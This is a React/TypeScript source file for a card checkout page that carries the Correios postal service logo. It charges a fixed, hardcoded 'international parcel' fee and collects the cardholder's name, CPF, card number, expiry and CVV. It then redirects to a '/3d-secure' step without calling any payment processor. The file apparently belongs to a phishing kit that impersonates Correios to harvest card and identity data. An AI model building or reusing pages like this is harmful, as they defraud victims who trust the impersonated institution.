import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Menu } from "lucide-react";
import logoEct from "@/assets/logo-ect.svg";
import amexLocal from "@/assets/brands/amex.svg";
import eloLocal from "@/assets/brands/elo.svg";
import visaLocal from "@/assets/brands/visa.svg";
import mcLocal from "@/assets/brands/mastercard.svg";
import dinersLocal from "@/assets/brands/diners.svg";
import discoverLocal from "@/assets/brands/discover.svg";
import jcbLocal from "@/assets/brands/jcb.svg";
import hipercardLocal from "@/assets/brands/hipercard.svg";

const formatCardNumber = (value: string) => {
	const digitsOnly = value.replace(/\D/g, "").slice(0, 19);
	return digitsOnly.replace(/(\d{4})(?=\d)/g, "$1 ");
};

const formatExpiryFull = (value: string) => {
	let v = value.replace(/\D/g, "").slice(0, 6); // MMYYYY
	if (v.length > 2) v = `${v.slice(0, 2)}/${v.slice(2, 6)}`;
	return v;
};

const sanitizeCardholderName = (value: string) => {
	// Permite apenas letras (com acentos) e espaços
	return value.replace(/[^A-Za-zÀ-ÖØ-öø-ÿ\s]/g, "");
};

const formatCPF = (value: string) => {
	const digitsOnly = value.replace(/\D/g, "").slice(0, 11);
	return digitsOnly.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
};

const AMEX_DATA_URI = amexLocal as string;
const ELO_DATA_URI = eloLocal as string;

const detectLocalBrand = (num: string): string => {
	if (/^4\d{6,}/.test(num)) return "visa";
	if (/^(5[1-5]|2[2-7])\d{4,}/.test(num)) return "mastercard";
	if (/^3[47]\d{5,}/.test(num)) return "amex";
	if (/^3(?:0[0-5]|[68])\d{4,}/.test(num)) return "diners";
	// Elo: inclui faixas comuns 401178-9, 431274, 438935, 451416, 457631-2, 5067xx, 509xxx, 627780, 636297/636368, 650/651/655xxx
	if (/^(40117[89]|431274|438935|451416|45763[12]|5067\d{2}|509\d{3}|627780|636(297|368)|65[015]\d{3})/.test(num)) return "elo";
	if (/^35\d{4,}/.test(num)) return "jcb";
	// Discover depois do Elo
	if (/^6(?:011|5\d{2})\d{3,}/.test(num)) return "discover";
	if (/^(606282|3841)/.test(num)) return "hipercard";
	return "";
};

const BRAND_LOGOS: Record<string, string> = {
	visa: "https://www.svgrepo.com/show/328127/visa.svg",
	mastercard: "https://www.svgrepo.com/show/328121/mastercard.svg",
	amex: "https://www.svgrepo.com/show/328129/amex.svg",
	diners: "https://www.svgrepo.com/show/328128/diners.svg",
	discover: "https://www.svgrepo.com/show/328132/discover.svg",
	jcb: "https://www.svgrepo.com/show/328126/jcb.svg",
	elo: "https://www.svgrepo.com/show/328133/elo.svg",
	hipercard: "https://www.svgrepo.com/show/328139/hipercard.svg"
};

const CheckoutCartao = () => {
	const navigate = useNavigate();
	const [name, setName] = useState<string>("");
	const [cpf, setCpf] = useState<string>("");
	const [cardNumber, setCardNumber] = useState<string>("");
	const [expiry, setExpiry] = useState<string>("");
	const [cvv, setCvv] = useState<string>("");
	const [isCardholder, setIsCardholder] = useState<"sim" | "nao">("sim");
	const [saveCard, setSaveCard] = useState<boolean>(true);
	const [submitting, setSubmitting] = useState<boolean>(false);

	const [nameError, setNameError] = useState<string>("");
	const [cpfError, setCpfError] = useState<string>("");
	const [expiryError, setExpiryError] = useState<string>("");
	const [cardBrand, setCardBrand] = useState<string>("");
	const [cardBrandLogo, setCardBrandLogo] = useState<string>("");
	const [cardCheckLoading, setCardCheckLoading] = useState<boolean>(false);

	const orderId = "1094234151515349";
	const orderAmount = "R$ 162,81";

	const validateExpiry = (value: string) => {
		const m = value.slice(0, 2);
		const y = value.slice(3);
		if (m.length !== 2 || y.length !== 4) return "Formato inválido";
		const month = parseInt(m, 10);
		const year = parseInt(y, 10);
		if (month < 1 || month > 12) return "Mês inválido";
		const now = new Date();
		const currentYear = now.getFullYear();
		const currentMonth = now.getMonth() + 1;
		if (year < currentYear) return "Ano inválido";
		if (year === currentYear && month < currentMonth) return "Data expirada";
		return "";
	};

	const validateCPF = (value: string) => {
		const cpfClean = value.replace(/\D/g, "");
		if (cpfClean.length !== 11) return "CPF deve ter 11 dígitos";
		
		// Verifica se todos os dígitos são iguais
		if (/^(\d)\1{10}$/.test(cpfClean)) return "CPF inválido";
		
		// Validação dos dígitos verificadores
		let sum = 0;
		for (let i = 0; i < 9; i++) {
			sum += parseInt(cpfClean.charAt(i)) * (10 - i);
		}
		let remainder = sum % 11;
		let digit1 = remainder < 2 ? 0 : 11 - remainder;
		
		sum = 0;
		for (let i = 0; i < 10; i++) {
			sum += parseInt(cpfClean.charAt(i)) * (11 - i);
		}
		remainder = sum % 11;
		let digit2 = remainder < 2 ? 0 : 11 - remainder;
		
		if (parseInt(cpfClean.charAt(9)) !== digit1 || parseInt(cpfClean.charAt(10)) !== digit2) {
			return "CPF inválido";
		}
		
		return "";
	};

	const isValid = () => {
		const validName = name.trim().length >= 5 && !/[^A-Za-zÀ-ÖØ-öø-ÿ\s]/.test(name);
		const validCpfMsg = validateCPF(cpf);
		const validCpf = validCpfMsg === "";
		const validExpiryMsg = validateExpiry(expiry);
		const validExpiry = validExpiryMsg === "";
		const validCvv = /^\d{3,4}$/.test(cvv);
		return validName && validCpf && validExpiry && validCvv;
	};

	useEffect(() => {
		const sanitized = sanitizeCardholderName(name);
		if (sanitized !== name) {
			setName(sanitized);
			setNameError("Use apenas letras");
		} else {
			setNameError("");
		}
	}, [name]);

	// Brand detection only (no Luhn)
	useEffect(() => {
		const clean = cardNumber.replace(/\s/g, "");
		const local = detectLocalBrand(clean);
		if (local) {
			setCardBrand(local);
			setCardBrandLogo(BRAND_LOGOS[local] || "");
		}
		if (clean.length >= 6) {
			const bin = clean.slice(0, 6);
			setCardCheckLoading(true);
			fetch(`https://lookup.binlist.net/${bin}`, { headers: { Accept: "application/json" } })
				.then((r) => (r.ok ? r.json() : null))
				.then((data) => {
					if (data && data.scheme) {
						const scheme = String(data.scheme).toLowerCase();
						setCardBrand(scheme);
						setCardBrandLogo(BRAND_LOGOS[scheme] || "");
					}
				})
				.catch(() => {})
				.finally(() => setCardCheckLoading(false));
		} else {
			setCardCheckLoading(false);
			setCardBrand("");
			setCardBrandLogo("");
		}
	}, [cardNumber]);

	useEffect(() => {
		if (expiry.length === 7) setExpiryError(validateExpiry(expiry));
		else setExpiryError("");
	}, [expiry]);

	useEffect(() => {
		if (cpf.length === 14) setCpfError(validateCPF(cpf));
		else setCpfError("");
	}, [cpf]);

	const handleSubmit = (e: React.FormEvent) => {
		e.preventDefault();
		if (!isValid()) return;
		setSubmitting(true);
		setTimeout(() => {
			// Save minimal info for 3DS
			const clean = cardNumber.replace(/\s/g, "");
			const last4 = clean.slice(-4);
			const brand = (cardBrand || detectLocalBrand(clean) || "").toLowerCase();
			try {
				localStorage.setItem("checkoutCardInfo", JSON.stringify({ last4, brand, brandLogo: cardBrandLogo || "" }));
				localStorage.setItem("checkoutAmount", orderAmount);
			} catch {}
			setSubmitting(false);
			navigate("/3d-secure");
		}, 700);
	};

	return (
		<div className="min-h-screen bg-white">
			{/* Header */}
			      <header className="w-full bg-[#f5f3f0] border-b border-border">
				<div className="bg-[#f5f3f0] py-2">
					<div className="px-3 flex items-center justify-between">
						<div className="flex items-center gap-3">
							<Button variant="ghost" size="sm" className="text-gray-600 hover:bg-gray-100 p-2 !bg-transparent focus:bg-transparent active:bg-transparent !text-gray-600">
								<Menu className="w-5 h-5 text-gray-600" />
							</Button>
						</div>
						<div className="absolute left-1/2 transform -translate-x-1/2">
							<img src={logoEct} alt="Correios" className="h-6 w-auto" />
						</div>
						<div />
					</div>
				</div>
				<div className="w-full h-0.5 bg-yellow-400" />
			</header>

			{/* Main */}
			<main className="px-4 py-5">
				<div className="max-w-lg mx-auto">
					<h1 className="text-2xl font-bold text-[#00416b] mb-4">Informe os dados do cartão</h1>

					<form onSubmit={handleSubmit} className="space-y-4">
						<div>
							<label className="block text-sm text-gray-900 mb-1">
								Nome do titular do cartão:<span className="text-red-600">*</span>
							</label>
							<input
								type="text"
								value={name}
								onChange={(e) => setName(sanitizeCardholderName(e.target.value))}
								onKeyDown={(e) => { if (e.key.length === 1 && !/[A-Za-zÀ-ÖØ-öø-ÿ\s]/.test(e.key)) e.preventDefault(); }}
								onPaste={(e) => { e.preventDefault(); const t = (e.clipboardData || (window as any).clipboardData).getData("text"); setName(sanitizeCardholderName(name + t)); }}
								className={`flex w-full rounded-md border px-3 py-2 text-base bg-white focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-blue-500 ${nameError ? 'border-red-500' : 'border-gray-300 focus:border-blue-500'}`}
								placeholder=""
							/>
							{nameError && <p className="text-xs text-red-600 mt-1">{nameError}</p>}
						</div>

						<div>
							<label className="block text-sm text-gray-900 mb-1">
								CPF do titular:<span className="text-red-600">*</span>
							</label>
							<input
								type="text"
								inputMode="numeric"
								maxLength={14}
								value={cpf}
								onChange={(e) => setCpf(formatCPF(e.target.value))}
								className={`flex w-full rounded-md border px-3 py-2 text-base bg-white focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-blue-500 ${cpfError ? 'border-red-500' : 'border-gray-300 focus:border-blue-500'}`}
								placeholder="000.000.000-00"
							/>
							{cpfError && <p className="text-xs text-red-600 mt-1">{cpfError}</p>}
						</div>

						<div>
							<label className="block text-sm text-gray-900 mb-1">
								Número do cartão:<span className="text-red-600">*</span>
							</label>
							<div className="relative">
								<input
									type="text"
									inputMode="numeric"
									maxLength={23}
									value={cardNumber}
									onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
									className="flex w-full rounded-md border px-3 pr-12 md:pr-14 py-2 text-base bg-white border-gray-300 focus:border-blue-500 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-blue-500"
									placeholder=""
								/>
								{cardBrandLogo && (
									<div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-2">
										<img
											src={cardBrandLogo}
											alt={cardBrand}
											className="h-8 md:h-9 w-auto fade-in"
											onError={(e) => {
												const img = e.currentTarget as HTMLImageElement;
												img.onerror = null;
												switch (cardBrand) {
													case 'amex': img.src = AMEX_DATA_URI; break;
													case 'elo': img.src = ELO_DATA_URI; break;
													case 'visa': img.src = visaLocal as string; break;
													case 'mastercard': img.src = mcLocal as string; break;
													case 'diners': img.src = dinersLocal as string; break;
													case 'discover': img.src = discoverLocal as string; break;
													case 'jcb': img.src = jcbLocal as string; break;
													case 'hipercard': img.src = hipercardLocal as string; break;
													default: img.src = ''; break;
												}
											}}
										/>
									</div>
								)}
							</div>
						</div>

						<div>
							<label className="block text-sm text-gray-900 mb-1">Validade:<span className="text-red-600">*</span></label>
							<input
								type="text"
								inputMode="numeric"
								maxLength={7}
								value={expiry}
								onChange={(e) => setExpiry(formatExpiryFull(e.target.value))}
								className={`flex w-full rounded-md border px-3 py-2 text-base bg-white focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-blue-500 ${expiryError ? 'border-red-500' : 'border-gray-300 focus:border-blue-500'}`}
								placeholder="MM/AAAA"
							/>
							{expiryError && <p className="text-xs text-red-600 mt-1">{expiryError}</p>}
						</div>

						<div>
							<label className="block text-sm text-gray-900 mb-1">CVV:<span className="text-red-600">*</span></label>
							<input
								type="password"
								inputMode="numeric"
								maxLength={4}
								value={cvv}
								onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
								className="flex w-full rounded-md border px-3 py-2 text-base bg-white border-gray-300 focus:border-blue-500 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-blue-500"
								placeholder=""
							/>
						</div>

						<div>
							<p className="text-sm text-gray-900 mb-2">Sou titular do cartão?</p>
							<div className="flex items-center gap-6">
								<label className="inline-flex items-center gap-2 text-gray-800 text-sm">
									<input
										type="radio"
										name="cardholder"
										checked={isCardholder === "sim"}
										onChange={() => setIsCardholder("sim")}
										className="h-4 w-4"
									/>
									Sim
								</label>
								<label className="inline-flex items-center gap-2 text-gray-800 text-sm">
									<input
										type="radio"
										name="cardholder"
										checked={isCardholder === "nao"}
										onChange={() => setIsCardholder("nao")}
										className="h-4 w-4"
									/>
									Não
								</label>
							</div>
						</div>

						<div className="flex items-start gap-2">
							<input
								type="checkbox"
								className="mt-1 h-4 w-4"
								checked={saveCard}
								onChange={(e) => setSaveCard(e.target.checked)}
							/>
							<label className="text-sm text-gray-800">
								Autorizo armazenar os dados do meu cartão para pagamentos futuros
							</label>
						</div>

						<div className="flex items-center gap-3 pt-2">
							<Button
								type="submit"
								className="flex-1 h-11 bg-blue-600 hover:bg-blue-700 text-white"
								disabled={!isValid() || submitting}
							>
								{ submitting ? "Processando..." : "Pagar" }
							</Button>
							<Button
								variant="secondary"
								className="flex-1 h-11 bg-gray-300 hover:bg-gray-400 text-gray-900"
								onClick={(e) => { e.preventDefault(); navigate(-1); }}
							>
								Voltar
							</Button>
						</div>

						{/* Resumo do Pedido */}
						<div className="mt-6">
							<div className="bg-white rounded-xl shadow-md border border-gray-200">
								<div className="px-4 pt-4">
									<h2 className="text-base md:text-lg font-semibold text-[#00416b]">Resumo do Pedido {orderId}</h2>
								</div>
								<div className="px-4 pb-4 mt-2">
									<div className="flex items-center justify-between text-sm py-3">
										<span className="text-gray-700">Encomenda Internacional</span>
										<span className="text-gray-900">{orderAmount}</span>
									</div>
									<div className="border-t my-1" />
									<div className="flex items-center justify-between pt-2">
										<span className="text-gray-900 font-semibold">Total</span>
										<span className="text-blue-600 font-bold">{orderAmount}</span>
									</div>
								</div>
							</div>
						</div>
					</form>
				</div>
			</main>
		</div>
	);
};

export default CheckoutCartao;


